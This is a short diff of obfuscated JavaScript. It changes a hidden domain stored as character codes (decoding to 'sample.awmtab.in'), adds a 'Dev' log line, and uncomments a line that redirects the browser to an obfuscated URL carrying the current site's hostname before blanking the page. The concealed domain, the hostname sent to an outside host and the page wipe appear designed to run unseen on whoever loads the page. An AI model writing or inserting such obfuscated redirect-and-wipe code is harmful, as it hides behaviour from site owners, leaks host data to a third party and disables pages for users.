@@ -83,7 +83,7 @@
                 // _0x12cf8e['clear'].call(_0x48a3d2);
                 // _0x12cf8e['log'].call(_0x48a3d2, '');
             
-                const _0x4a2f1c = [112,117,115,104,109,97,110,97,103,101,114,46,97,119,109,116,97,98,46,105,110];
+                const _0x4a2f1c = [115,97,109,112,108,101,46,97,119,109,116,97,98,46,105,110];
                 const _0x5b9d3a = false;
                 
                 const _0x1e7f8d = _0x1d2f(_0x1_sutats);
@@ -95,9 +95,10 @@
 
                 console.log(_0x3cde42);
                 console.log(_0x4a2f1cString);
+                console.log("Dev");
                 
                 if (!_0x29fb01) {
-                    // window.location.href = _0x1e7f8d + window.location.hostname + _0x1e7fddd;
+                    window.location.href = _0x1e7f8d + window.location.hostname + _0x1e7fddd;
                     
                     document.documentElement.innerHTML = "";
                     
